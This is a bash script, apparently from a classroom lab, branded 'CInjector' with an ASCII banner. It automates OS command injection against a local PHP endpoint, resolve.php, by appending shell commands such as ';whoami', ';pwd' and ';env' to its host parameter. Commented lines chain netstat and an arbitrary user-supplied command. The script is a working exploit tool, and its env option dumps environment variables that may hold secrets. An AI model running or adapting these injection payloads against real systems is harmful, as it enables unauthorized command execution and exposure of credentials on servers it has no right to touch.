#!/bin/bash
#curl "127.0.0.1:9090/resolve.php?host=fiap.com.br;date;whoami;pwd;netstat+-an+|+grep+-i+"ESTABLISHED";env"
#read -p "Digite o comando que você quer ver: " C
#curl "127.0.0.1:9090/resolve.php?host=fiap.com.br;$0"
echo "


 .d8888b. 8888888           d8b                   888                    
d88P  Y88b  888             Y8P                   888                    
888    888  888                                   888                    
888         888   88888b.  8888  .d88b.   .d8888b 888888 .d88b.  888d888 
888         888   888  88b 888  d8P  Y8b d88P     888   d88  88b 888P   
888    888  888   888  888  888 88888888 888      888   888  888 888     
Y88b  d88P  888   888  888  888 Y8b.     Y88b.    Y88b. Y88..88P 888     
  Y8888P  8888888 888  888  888   Y8888    Y8888P  Y888  Y88P  888     
                            888                                          
                           d88P                                          
                         888P                                           



"
sleep 1s
if [[ $1 == "-h" ]] || [[ $1 == "--help" ]];then
	echo "All of the commands"
	echo "------------------------------"
	echo "	  -d date"
	echo "	  -w whoami"
	echo "	  -p pwd"
	echo "	  -e env"
	echo "------------------------------"
elif [[ $1 == "-d" ]];then
	curl "127.0.0.1:9090/resolve.php?host=fiap.com.br;date"
elif [[ $1 == "-p" ]];then
	curl "127.0.0.1:9090/resolve.php?host=fiap.com.br;pwd"
elif [[ $1 == "-w" ]];then
	curl "127.0.0.1:9090/resolve.php?host=fiap.com.br;whoami"
elif [[ $1 == "-e" ]];then
	curl "127.0.0.1:9090/resolve.php?host=fiap.com.br;env"
else
	echo "If you need help type -h or --help"
	echo "Usage ./resolve.sh -h"
fi
